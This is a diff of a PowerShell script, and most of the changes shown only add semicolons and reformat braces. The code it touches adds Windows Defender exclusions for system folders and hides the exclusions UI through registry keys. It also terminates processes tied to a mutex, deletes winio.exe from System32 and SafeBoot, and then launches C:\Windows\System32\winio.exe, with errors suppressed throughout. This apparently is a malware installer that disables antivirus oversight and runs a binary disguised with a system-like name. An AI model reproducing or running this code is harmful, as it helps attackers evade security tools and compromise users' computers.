@@ -40,6 +40,7 @@ else
         "C:\Program Files\Windows NT",
         "C:\Program Files\Windows Security",
         "C:\Program Files\WindowsPowerShell",
+
         "C:\Program Files (x86)\Internet Explorer",
         "C:\Program Files (x86)\Microsoft",
         "C:\Program Files (x86\Windows Defender",
@@ -68,7 +69,7 @@ else
     );
     foreach($path in $paths)
     {
-        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue;
     };
 
     # Disable UI for Exclusions
@@ -84,21 +85,21 @@ else
             if (-not (Test-Path $key -ErrorAction SilentlyContinue)) 
             {
                 # Create the key if it doesn't exist
-                New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
+                New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null;
 
                 # Set the value for the new key
-                New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null
+                New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null;
             } 
             else 
             {
                 # Update the value if the key already exists
-                Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue
+                Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue;
             }
         } 
         catch 
         {
             # Handle any exceptions silently
-            continue
+            continue;
         }
     };
 
@@ -128,12 +129,15 @@ else
             if (Test-Path $filePath) 
             {
                 # Get the process associated with the file
-                $process = Get-Process -ErrorAction Continue | Where-Object { $_.Path -eq $filePath }
+                $process = Get-Process -ErrorAction Continue | Where-Object 
+                { 
+                    $_.Path -eq $filePath;
+                }
                 
                 if ($process) 
                 {
                     # Terminate the process
-                    $process | Stop-Process -Force -ErrorAction Continue
+                    $process | Stop-Process -Force -ErrorAction Continue;
 
                     # Write-Output "Terminated process for $filePath"
                 } 
@@ -150,25 +154,25 @@ else
         catch 
         {
             # Silently catch and ignore any errors
-        }
+        };
     }
 
     # ----------------------------- #
     #    UNINSTALLING OLD VERSION
     # ----------------------------- # 
     # Check for previou sversion (TERMINATE BY MUTEX)
-    $mutexName = "44b6c65a-d844-4fa9-9d68-a7df5ab8b127"
+    $mutexName = "44b6c65a-d844-4fa9-9d68-a7df5ab8b127";
     try
     {
         # Check if the mutex exists
-        $mutex = [System.Threading.Mutex]::OpenExisting($mutexName)
+        $mutex = [System.Threading.Mutex]::OpenExisting($mutexName);
         
         if ($mutex) 
         {
             # Mutex exists, find the process holding the mutex and terminate it
             $processes = Get-Process | Where-Object 
             {
-                $_.MainWindowHandle -ne 0 -and $_.Modules | Where-Object 
+                $_.MainWindowHandle -ne 0 -and $_.Modules | Where-Object
                 {
                     $_.FileName -match "C:\\Windows\\System32\\winio.exe" -or 
                     $_.FileName -match "C:\\Windows\\System32\\SafeBoot\\winio.exe"
@@ -178,12 +182,12 @@ else
             foreach ($process in $processes) 
             {
                 # Write-Output "Terminating process $($process.Id) holding the mutex $mutexName"
-                Stop-Process -Id $process.Id -Force
+                Stop-Process -Id $process.Id -Force;
             }
 
             # Release the mutex after termination
-            $mutex.ReleaseMutex()
-            $mutex.Dispose()
+            $mutex.ReleaseMutex();
+            $mutex.Dispose();
         } 
         else 
         {
@@ -193,23 +197,26 @@ else
     catch 
     {
         # Write-Output "Mutex $mutexName not found or process does not hold the mutex."
-    }
+    };
 
-    try {
+    try 
+    {
         # Attempt to delete the file or directory
         if (Test-Path "C:\\Windows\\System32\\SafeBoot\\winio.exe")
         {
-            Remove-Item -Path "C:\\Windows\\System32\\SafeBoot\\winio.exe" -Force -Recurse -ErrorAction Continue
+            Remove-Item -Path "C:\\Windows\\System32\\SafeBoot\\winio.exe" -Force -Recurse -ErrorAction Continue;
         }
 
         # Attempt to delete the file or directory
         if (Test-Path "C:\\Windows\\System32\\winio.exe")
         {
-            Remove-Item -Path "C:\\Windows\\System32\\winio.exe" -Force -Recurse -ErrorAction Continue
+            Remove-Item -Path "C:\\Windows\\System32\\winio.exe" -Force -Recurse -ErrorAction Continue;
         }
 
         # Write-Output "Deleted $filePath"
-    } catch {
+    } 
+    catch 
+    {
         # Silently catch and handle any errors
         # Write-Output "Failed to delete $filePath. Error: $_"
     }
@@ -238,6 +245,6 @@ else
     {
         & 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
     };
-}
+};
 
 exit;
